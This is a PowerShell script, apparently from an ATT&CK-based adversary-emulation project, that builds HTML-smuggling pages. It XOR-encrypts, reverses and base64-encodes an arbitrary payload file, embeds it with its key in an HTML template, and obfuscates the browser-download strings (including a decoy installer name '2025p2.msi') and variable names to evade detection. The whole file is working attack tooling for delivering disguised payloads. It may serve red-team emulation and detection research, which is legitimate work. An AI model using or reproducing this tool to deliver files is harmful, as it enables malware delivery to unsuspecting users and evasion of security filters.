 # ---------------------------------------------------------------------------
 # embed_smuggled_payload.ps1 - Reads in payload file, XOR-encrypts the data
 # using a randomly generated key, reverses the ciphertext array, and embeds
 # the base64-encoded ciphertext and key into header HTML template.
 # Will also obfuscate variables and strings in the HTML template file.

 # This project makes use of ATT&CK®
 # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/

 # Usage: powershell -file embed_smuggled_payload.ps1 -Template HTML_TEMPLATE -InputFile PAYLOAD_FILE -OutputFile OUTPUT_FILE

 # ---------------------------------------------------------------------------


<#
.Description

Encypts, reverses, base64-encodes, and embeds provided input file as a byte array in HTML template.
Encryption key is randomly generated and also embedded.
Obfuscates variables and strings in the HTML template file.

.Parameter Template

Template header file

.Parameter InputFile

Input file to embed

.Parameter OutputFile

Output header file

#>
Param(
    [Parameter(Mandatory=$true)][String]$Template,
    [Parameter(Mandatory=$true)][String]$InputFile,
    [Parameter(Mandatory=$true)][String]$OutputFile
)

function XOR-Encrypt {
    Param(
        [Parameter(Mandatory=$true)][Byte[]] $Plaintext,
        [Parameter(Mandatory=$true)][Byte[]] $Key
    )

    $keyLen = $Key.Count;
    $plaintextLen = $Plaintext.Count;
    for ($i = 0; $i -lt $plaintextLen; $i++) {
        $Plaintext[$i] = $Plaintext[$i] -bxor $Key[$i % $keyLen];
    }
}

# Converts byte array to split base64-string to include in
# the header template, with 50 characters per string chunk by default.
function BytesToHTMLString {
    Param(
        [Parameter(Mandatory=$true)][Byte[]] $InputBytes,
        [int] $ChunkSize=50
    )

    $base64Str = [Convert]::ToBase64String($InputBytes);
    $embeddedBytesStr = (
        $base64Str -split "(.{$ChunkSize})" -ne '' | %{ "'$_'"}
    ) -join "+";
    $embeddedBytesStr;
}

# Converts byte array to a Javascript array variable
# to include in the header template.
function BytesToArrayString {
    Param(
        [Parameter(Mandatory=$true)][Byte[]] $InputBytes
    )

    $embeddedVarStr = "[" + ($InputBytes -join ",") + "]";
    $embeddedVarStr;
}

echo "[INFO] Embedding $InputFile into template file $Template to create $OutputFile.";

# Read input and template files
$inputBytes = [System.IO.File]::ReadAllBytes("$InputFile");
$templateText = Get-Content -Raw "$Template";

# Generate key
$payloadKey = [Byte[]]::new(32);
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create();
$rng.GetBytes($payloadKey);

$payloadKeyStr = ($payloadKey | %{"{0:X2}" -f $_}) -join "";
echo "[INFO] Generated key: $payloadKeyStr";

# XOR encrypt and reverse payload
echo "[INFO] Encrypting and reversing payload";
XOR-Encrypt -Plaintext $inputBytes -Key $payloadKey;
[array]::Reverse($inputBytes);

# Generate encoded encrypted payload string
$count = 0;
$embeddedBytesStr = BytesToHTMLString -InputBytes $inputBytes;

# Generate key variable text
$keyStr = BytesToArrayString -InputBytes $payloadKey;

# Embed encrypted payload bytes
echo "[INFO] Embedding payload and XOR key";
$outputText = $templateText.Replace("INPUT_PLACEHOLDER", "$embeddedBytesStr");

# Embed key
$outputText = $outputText.Replace("KEY_PLACEHOLDER", "$keyStr");

# Obfuscate strings
echo "[INFO] Obfuscating strings";
$stringsLiterals = @(
    'octet/stream',
    'display: none',
    'createObjectURL',
    'href',
    'download',
    '2025p2.msi',
    'click',
    'revokeObjectURL'
);
$stringsLiterals | %{
    $literalBytes = [System.Text.Encoding]::ASCII.GetBytes($_);
    #$encodedLiteral =[Convert]::ToBase64String($literalBytes);
    $encodedLitStr = BytesToHTMLString -InputBytes $literalBytes -ChunkSize 6;
    $outputText = $outputText.Replace("'$_'", "window.atob($encodedLitStr)");
};

# Obfuscate variable names
echo "[INFO] Obfuscating variable names";
$obfuscatedVarMap = @{
    'b64String' = 'zkqosjj1231i';
    'bStrLen' = 'Eopqjfu93j';
    'byteStr' = 'IQug4annx';
    'retBytes' = 'KAJK29ejo';
    'inputKey' = 'k2Qu2utud';
    'keyLength' = 'xmmru';
    'fileByteBuffer' = 'wruqrwtu212U';
    'fileBlob' = 'QOosjgfj';
    'linkAnchor' = 'sfkjqejgj';
    'fileUrl' = 'JKAjvmm1';
};
foreach ($pair in $obfuscatedVarMap.GetEnumerator()) {
    $outputText = $outputText.Replace("$($pair.Name)", "$($pair.Value)");
}

$outputText | Out-File -FilePath "$OutputFile";
